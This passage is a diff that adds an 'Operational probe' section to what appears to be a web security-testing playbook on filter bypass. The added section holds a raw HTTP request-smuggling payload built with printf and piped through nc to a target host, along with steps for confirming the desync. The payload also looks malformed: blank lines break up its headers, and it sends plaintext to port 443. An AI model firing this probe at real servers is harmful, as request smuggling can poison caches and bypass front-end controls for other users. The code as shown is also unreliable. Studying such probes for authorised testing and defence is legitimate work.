@@ -56,6 +56,39 @@ applies.
 - A rule that matches an unanchored pattern, or compares with containment rather
   than equality, is bypassable without any protocol trick at all.
 
+## Operational probe
+
+```bash
+printf 'POST /search HTTP/1.1
+
+Host: %s
+
+Content-Length: 4
+
+Transfer-Encoding: chunked
+
+
+
+5c
+
+GPOST / HTTP/1.1
+
+
+
+0
+
+
+
+' "$HOST" | nc "$HOST" 443
+```
+
+Send the ambiguous request once and record **both** raw status lines — the
+front-end's answer to the first request and what a second queued request
+proves about where the bytes were split. Confirmation requires a response that
+belongs to a request the front-end never saw (smuggled content reached the
+back-end as a new request). A single error or a dropped connection is not a
+differential.
+
 ## Routing
 
 Shares signals with: `../web-request-smuggling/`, `../web-auth-session/`. Check those before committing to this one.
